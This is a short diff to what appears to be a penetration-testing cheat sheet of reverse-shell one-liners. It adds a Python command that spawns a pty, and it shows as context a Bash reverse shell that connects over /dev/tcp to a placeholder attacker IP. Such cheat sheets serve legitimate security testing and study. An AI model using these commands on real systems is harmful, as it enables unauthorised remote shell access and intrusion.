@@ -93,6 +93,11 @@ available on one machine, but Perl is on another. Some of these can be
 modified and injected or included in web applications in certain
 cases. Thanks to pentestmonkey.net for most of these.
 
+- Spawning a pty w/ Python for better control of reverse shells
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
 - Bash using /dev/tcp
 ```
 bash -i >& /dev/tcp/ATTACKER.IP.HERE/PORT 0>&1
